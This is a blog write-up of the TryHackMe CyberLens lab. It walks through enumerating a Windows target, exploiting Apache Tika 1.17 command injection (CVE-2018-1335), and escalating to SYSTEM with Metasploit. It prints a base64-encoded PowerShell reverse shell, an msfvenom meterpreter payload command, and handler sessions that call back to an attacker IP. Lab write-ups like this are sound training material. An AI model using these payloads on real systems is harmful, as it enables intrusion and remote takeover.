---
title: "TryHackMe - Cyberlens"
author: Nasrallah
description: ""
date: 2024-10-09 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, windows, easy, cve, rce]
img_path: /assets/img/tryhackme/cyberlens
image:
    path: cyberlens.png
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---

[CyberLens](https://tryhackme.com/room/cyberlensp6) from [TryHackMe](https://tryhackme.com/signup?referrer=603949780215185dfb191142) is an easy box running a software on a non standard port that is vulnerable to RCE giving us a foothold. After that we run exploit suggester on metasploit and use the first recommended one and get system.

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.57 ((Win64))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.57 (Win64)
|_http-title: CyberLens: Unveiling the Hidden Matrix
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-10-05T13:24:37+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=CyberLens
| Not valid before: 2024-10-04T13:22:02
|_Not valid after:  2025-04-05T13:22:02
| rdp-ntlm-info: 
|   Target_Name: CYBERLENS
|   NetBIOS_Domain_Name: CYBERLENS
|   NetBIOS_Computer_Name: CYBERLENS
|   DNS_Domain_Name: CyberLens
|   DNS_Computer_Name: CyberLens
|   Product_Version: 10.0.17763
|_  System_Time: 2024-10-05T13:24:30+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-10-05T13:24:31
|_  start_date: N/A
```

As we can see the target is a windows machine running an apache web server on port 80, RDP on port 3389 and SMB.

### Web

Let's check the website on port 80.

![website](1.png)

Scrolling down the web page we can see a file upload.

I checked the source code to see how it works but stumbled into something interesting.

![redirect](2.png)

We can see there is another website on port 61777.

Let's add `cyberlens.thm` to `/etc/hosts` file and check it out.

![vulnwebsite](3.png)

It's running `Apache Tika 1.17`.

A quick search on google reveals that this version is vulnerable to command injection.

## **Foothold**

I downloaded the exploit from this repo <https://github.com/canumay/cve-2018-1335>

```terminal
$ python exploit.py                                                                                                                                                                   
Usage: python exploit.py <host> <port> <command>
Example: python exploit.py localhost 9998 calc.exe 
```

The script takes three arguments. Let's submit those and run it.

```terminal
python exploit.py 10.10.188.124 61777 whoami
```

Nothing happened here.

I though maybe it's blind command injection to I tried to ping my machine and listen with `tcpdump`

![tcpdump](4.png)

It worked, now let's get a reverse shell. I'll be using a base64 encoded powershell command from <https://www.revshells.com>

```terminal
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AOQAuADQALgAyADEAMwAiACwAOQAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```

![shell](5.png)

We got the shell.

## **Privilege Escalation**

I run winpeas and from the start it suggested a lot of exploits.

![winpeas](6.png)

I decided to get a shell on metasploit and then run the `local_exploit_suggester` module.

I created a exe using msfvenom.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.17.90 LPORT=9001 -f exe -o rev.exe
```

I uploaded the file using wget.

```bash
wget 10.10.10.10/rev.exe -o rev.exe
```

I setup a multi/handler on metasploit and run the `rev.exe`.

```terminal
[msf](Jobs:0 Agents:0) >> use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >>
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost tun0
lhost => tun0
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lport 4444
lport => 
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started reverse TCP handler on 10.9.4.213:4444 
[*] Sending stage (200774 bytes) to 10.10.188.124
[*] Meterpreter session 1 opened (10.9.4.213:4444 -> 10.10.188.124:49895) at 2024-10-05 15:08:19 +0100

(Meterpreter 1)(C:\Users\CyberLens\Downloads) >
```

I backgrounded the meterpreter session and used the `post/multi/recon/local_exploit_suggester`, set the session to 1 and run it.

![exploit](7.png)

The first exploit to be suggested is `exploit/windows/local/always_install_elevated` and it tells us the the target is vulnerable.

Let's use it and run it.

```terminal
[msf](Jobs:0 Agents:1) exploit(windows/local/always_install_elevated) >> set lhost tun0
lhost => 10.9.4.213
[msf](Jobs:0 Agents:1) exploit(windows/local/always_install_elevated) >> set lport 4433
lport => 4433
[msf](Jobs:0 Agents:1) exploit(windows/local/always_install_elevated) >> set session 1
session => 1
[msf](Jobs:0 Agents:1) exploit(windows/local/always_install_elevated) >> exploit 

[*] Started reverse TCP handler on 10.9.4.213:4433 
[*] Uploading the MSI to C:\Users\CYBERL~1\AppData\Local\Temp\1\hHHMgXu.msi ...
[*] Executing MSI...
[*] Sending stage (175686 bytes) to 10.10.188.124
[+] Deleted C:\Users\CYBERL~1\AppData\Local\Temp\1\hHHMgXu.msi
[*] Meterpreter session 2 opened (10.9.4.213:4433 -> 10.10.188.124:49902) at 2024-10-05 15:19:07 +0100

(Meterpreter 2)(C:\Windows\system32) > getuid
Server username: NT AUTHORITY\SYSTEM
```

We got system shell!

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

## References

<https://github.com/canumay/cve-2018-1335>
